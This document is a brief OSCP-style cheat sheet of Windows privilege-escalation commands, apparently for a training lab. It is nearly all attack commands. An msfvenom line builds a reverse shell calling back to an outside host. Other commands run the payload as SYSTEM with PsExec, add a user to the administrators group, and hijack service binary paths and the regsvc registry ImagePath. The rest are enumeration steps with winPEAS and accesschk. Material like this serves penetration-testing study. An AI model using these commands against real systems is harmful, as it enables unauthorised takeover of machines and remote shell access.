# OSCP-Windows-Priv-Escalation

## Table of Contents
- [Windows Commands](#windows-commands)
 

Windows Commands
========================================================================================================
- root@kali: /tools# /usr/share/doc/python3-impacket/examples/smbserver.py tools .
- whoami
- net user user
- dir local.txt /s (Search local.txt)
- query user
- ipconfig
-  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe
- net localgroup administrators <username> /add
- .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
- reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
- winPEASany.exe quiet cmd fast
- winPEASany.exe quiet cmd systeminfo
- sc qc daclsvc
- sc query daclsvc
- sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
- net start/stop <name>
- winPEASany.exe quiet servicesinfo > serviceinfo.txt
- more serviceinfo.txt
- net stop daclsvc
- net start daclsvc
- winPEASany.exe quiet servicesinfo
- accesschk.exe /accepteula -uwcqv user daclsvc
- accesschk.exe /accepteula -uwdq C:\
- accesschk.exe /accepteula -uwdq "C:\Program Files\"
- copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
- powershell -exec bypass
- PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
- accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
- accesschk.exe /accepteula -ucqv user regsvc
- reg query HKLM\system\currentcontrolset\services\regsvc
- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
